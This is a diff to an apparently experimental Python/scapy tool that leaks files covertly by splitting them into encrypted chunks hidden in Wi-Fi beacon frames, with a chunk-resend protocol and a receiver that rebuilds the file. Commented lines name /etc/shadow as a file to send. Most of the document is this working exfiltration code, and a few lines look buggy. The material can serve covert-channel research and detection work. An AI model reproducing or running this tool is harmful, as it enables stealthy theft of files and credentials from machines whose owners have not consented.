@@ -28,9 +28,9 @@ global box, t_frame, if0, b_stats, beacons, science
 if0 = "wi7mon"
 
 # test file
-#t_file = "/home/null/Downloads/os/Win10_Edu_1803_EnglishInternational_x64.iso"
 #t_file = "/etc/shadow"
-t_file = "/tmp/test"
+#t_file = "tests/distanceTestFile"
+t_file = '/tmp/test'
 
 # test beacon
 ssid = 'beaconLeak'
@@ -172,42 +172,53 @@ def beacon_histogram():
     end = time.time()
     print("[*] end of experiment, duration: {} seconds".format(end - start))
 
-
+##
+# =============== here be dragons ===================
+##
 # chunk encrypt test (omg overhead)
-def send_file():
+import math
+def stat_file(filename):
     max_size = 325
-    f = open(t_file, 'rb')
+    f = open(filename, 'rb')
     file_size = f.seek(0, 2)
     print(f"\t[i] file size: {file_size} octets")
-    # QoS and Covert case
-    # y=(x+40)/((a - b) - (log10(x) + 41)) 
-    # d = a - Or - Oc1 - Oc2 - Ol1 - Ol2 - m
-    # TODO this can be optimized by counting in bytes instead, think ASN.1 or similar
-    import math
-    #print(f"\t[i] frame overhead: {len(t_frame)}")
     approx = max_size - len(t_frame) - 84
     magic = math.ceil(math.log10(file_size / approx) + 1) # sacrifice to the god of statistics
-    #print(f"\t[i] magic number: {magic}")
-    #chunks = math.ceil((file_size + 40) / (free - (magic + 40)))
     r_size = approx - magic
-    #print(f"\t[i] data space: {r_size}")
     chunks = math.ceil(file_size / r_size)
     print(f"\t[i] beacons needed to send file: {chunks}")
-    print("[*] Sending sync frame...")
-    end_word = os.urandom(4)
-    payload = f"{file_size}:{chunks}:{end_word}".encode('ascii')
+    f.close()
+    return (file_size, chunks, r_size)
+
+def stat_str(s):
+    max_size = 325
+    s_bytes = s.encode('utf-8')
+    s_size = len(s_bytes)
+    approx = max_size - len(t_frame) - 84
+    magic = math.ceil(math.log10(s_size / approx) + 1) # sacrifice to the god of statistics
+    r_size = approx - magic
+    chunks = math.ceil(s_size / r_size)
+    print(f"\t[i] beacons needed to send string: {chunks}")
+    return (s_size, chunks, r_size)
+
+
+def send_stat(filename):
+    file_size, chunks, r_size = stat_file(filename)
+    print("[*] Sending file stat frame...")
+    payload = f"{file_size}:{chunks}".encode('ascii')
     payload_c = box.encrypt(payload)
     _payload = Dot11Elt(ID=222, info=payload_c, len=len(payload_c))
     tmp_frame = t_frame / _payload
-    print(tmp_frame.command())
     sendp(tmp_frame, iface=if0, verbose=0, realtime=True)
-    input("Press enter to start data transmission...")
+
+def send_file(filename):    
     print("[*] Sending data...")
-    f.seek(0)
+    f = open(filename, 'rb')
+    file_size, chunks, r_size = stat_file(filename)
     pos = 0
     start = time.time()
     for seq in range(chunks):           
-        m_seq = str(seq).zfill(magic)
+        m_seq = str(seq)
         #print(f"\t[i] tag: {m_seq}")
         seq_c = box.encrypt(bytes(m_seq, 'ascii'))
         _seq = Dot11Elt(ID=253, info=seq_c, len=len(seq_c))
@@ -219,13 +230,54 @@ def send_file():
         _frame = t_frame / _seq / _data
         sendp(_frame, iface=if0, verbose=0, realtime=True)
         tell = f.tell()
-        print(f"\t[i] sent frame {seq + 1} of {chunks}, data[{pos}:{tell}], frame size: {len(_frame)}")
+        print(f"\t[i] sent frame {seq} of {chunks}, data[{pos}:{tell}], frame size: {len(_frame)}")
         pos = tell
         #input("[debug check]")
     end = time.time()
     print(f"[*] sent {chunks} in {end - start} seconds")
     band = (chunks * 325) / (end - start)
-    print(f"[*] speed: {band / 1000} kbps")
+    print(f"[*] speed: {(band * 8) / 1000} kbps")
+    print("[*] listening for chunk resend")
+    sniff(iface=opt.iface, stop_filter=check_missing, monitor=True)
+    print("[*] done!")
+
+
+# niiice
+def send_chunks(filename, chunk_list):
+    file_size, chunks, r_size = stat_file(filename)
+    with open(filename, 'rb') as f:    
+        for seq in chunk_list:
+            m_seq = str(seq)
+            seq_c = box.encrypt(bytes(m_seq, 'ascii'))
+            _seq = Dot11Elt(ID=253, info=seq_c, len=len(seq_c))
+            chunk_offset = (r_size * seq)
+            f.seek(chunk_offset)
+            chunk = f.read(r_size)
+            chunk_c = box.encrypt(chunk)
+            _data = Dot11Elt(ID=254, info=chunk_c, len=len(chunk_c))
+            _frame = t_frame / _seq / _data
+            sendp(_frame, iface=if0, verbose=0, realtime=True)
+            tell = f.tell()
+            print(f"\t[i] resent frame {seq} of {chunks}, data[{chunk_offset}:{tell}], frame size: {len(_frame)}")
+
+
+def check_missing(frame):
+    if frame.addr2 == t_frame.addr2:
+        if frame[Dot11Elt][6].ID == 223:
+            print("[*] No more to resend!")
+            return True
+        elif frame[Dot11Elt][6].ID == 224:
+            print("[*] chunk resend request found!")
+            try:
+                msg = box.decrypt(frame[Dot11Elt][6].info)
+                filename = box.decrypt(frame[Dot11Elt][7].info)
+                m_chunks = [int(x) for x in msg.split(b':')]
+                send_chunks(filename, m_chunks)
+                #return True
+            except Exception as e:
+                raise e
+                print("[e] check_missing failure: " + str(e))
+
 
 
 global recv
@@ -235,6 +287,8 @@ recv = dict(
     tally = None,
     tmp = None,
     done = False,
+    tick = None,
+    last = 3
 )
 def recv_file(frame):
     global recv
@@ -242,6 +296,18 @@ def recv_file(frame):
     tally = recv['tally']
     tmp = recv['tmp']
     done = recv['done']
+    if recv['tick'] and (time.time() - recv['tick']) > 1:
+        print("[*] No response in one second")
+        if tally and recv['last'] > 0:
+            print(f"[*] partial file found, but no response, trying again {recv['last']}")
+            recv['last'] = recv['last'] - 1
+            recv_missing(tally)
+            recv['tick'] = time.time()
+        else:
+            resp = t_frame / Dot11Elt(ID=223, info=b'\x00', len=1)
+            sendp(resp, iface=opt.iface, verbose=0, monitor=True, count=3)
+            tmp.close()
+            return True
     if frame.addr2 == t_frame.addr2:
         #print(frame.command())
         # overhead beacon
@@ -253,7 +319,8 @@ def recv_file(frame):
                 f_size = int(s_msg[0])
                 chunks = int(s_msg[1])
                 tally = [*range(chunks)]
-                print(f"\t[i] file size: {f_size}, total chunks: {chunks}")
+                recv['tick'] = time.time()
+                print(f"\t[i] file size: {f_size}, total chunks: {chunks}, tick: {recv['tick']}")
                 tmp = open('/tmp/leak.part', 'w+')
                 recv['chunks'] = chunks
                 recv['tally'] = tally
@@ -263,6 +330,8 @@ def recv_file(frame):
                 raise e
         # data beacon
         elif frame[Dot11Elt][6].ID == 253 and chunks > 0 and tmp:
+            recv['tick'] = time.time()
+            recv['last'] = 3
             try:
                 ovh = box.decrypt(frame[Dot11Elt][6].info)
                 ovh = int(ovh)
@@ -272,21 +341,36 @@ def recv_file(frame):
                 tmp.write(f"{ovh}:{data.hex()}\n")
                 if ovh + 1 == chunks:
                     print("[i] last chunk received!")
-                    done = True
-                    tmp.close()
                     if tally:
-                        print(f"[!] missing chunks: {tally}")                
+                        print(f"[!] missing chunks: {tally}")
+                        recv_missing(tally)
+                    else:
+                        resp = t_frame / Dot11Elt(ID=223, info=b'\x00', len=1)
+                        sendp(resp, iface=opt.iface, verbose=0, monitor=True)
+                        tmp.close()
+                        return True
                 recv['tally'] = tally
                 recv['done'] = done
             except ValueError as e:
-                print("[!] received duplicate chunk")
+                print("[!] received duplicate chunk " + str(e) )
             except Exception as e:
                 print(f"[e] corrupted beacon! expected chunk {chunk + (chunk * -1)}")
-        # wut
-        else:
-            print(f"[!] unexpected transmission (sanity:{recv})")
+
     return done
-            
+
+def recv_missing(tally):
+    msg = ":".join(str(x) for x in tally)
+    msg_c = box.encrypt(msg.encode('utf-8'))
+    fname = t_file
+    fname_c = box.encrypt(t_file.encode('utf-8'))
+    _data = Dot11Elt(ID=224, info=msg_c, len=len(msg_c))
+    _fname = Dot11Elt(ID=225, info=fname_c, len=len(fname_c))
+    sendp(t_frame / _data / _fname, iface=opt.iface)
+
+def sort_trick(line):
+    line_s = line.split(':')
+    return int(line_s[0])
+
 def decode_file():
     import hashlib
     orig = t_file
@@ -300,15 +384,26 @@ def decode_file():
     print("[*] Decrypting and calculating saved file sha256 hash")
     h_saved = hashlib.sha256()
     with open(saved) as f:
-        for line in f:
+        huge = f.readlines()
+        huge.sort(key=sort_trick)
+        test = open('/tmp/leaked', 'wb')
+        for line in huge:    
             info = line.split(':')
-            h_saved.update(box.decrypt(bytes.fromhex(info[1])))
+            print(info[0], end=", ")
+            chunk = box.decrypt(bytes.fromhex(info[1]))
+            test.write(chunk)
+            h_saved.update(chunk)
+        test.close()
+        print()
     d_saved = h_saved.hexdigest()
     print(f"\t{d_saved}")
     if d_orig == d_saved:
         print("[!] success!!")
 
 # battery of tests
+import argparse
+
+args = argparse.ArgumentParser()
 banner = """
      _                       __            _
     | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
@@ -318,6 +413,12 @@ banner = """
     """
 print(banner)
 
+args.add_argument("--recv", help="Receive mode test", action="store_true")
+args.add_argument("--send", help="Send mode test", action="store_true")
+args.add_argument("iface", help="monitor interface")
+
+opt = args.parse_args()
+
 #print("[*] size test")
 #size_test()
 #print("[*] size test breadth")
@@ -326,9 +427,26 @@ print(banner)
 #beacon_size_stats()
 #print("[*] Beacon Size IoC Experiment")
 #beacon_histogram()
-#print("[*] Send file test")
-#send_file()
-print("[*] QoS receive file test")
-sniff(iface=if0, stop_filter=recv_file, monitor=True)
-print("[*] File decode test")
-decode_file()
+#print("[*] Stat file test")
+#stat_file(t_file)
+#print("[*] stat string test")
+#stat_str(banner)
+
+
+if0 = opt.iface
+
+if opt.recv:
+    print("[*] QoS receive file test")
+    sniff(iface=opt.iface, stop_filter=recv_file, monitor=True)
+    print("[*] File decode test")
+    decode_file()
+elif opt.send:
+    #print("[*] Send file test")
+    #send_file()
+    #print("[*] waiting 5 seconds for receipt confirmation")
+    #sniff(iface=if0, stop_filter=check_missing, monitor=True) """
+    send_stat(t_file)
+    send_file(t_file)
+    #send_chunks("/etc/shadow", [1, 3, 5])
+
+
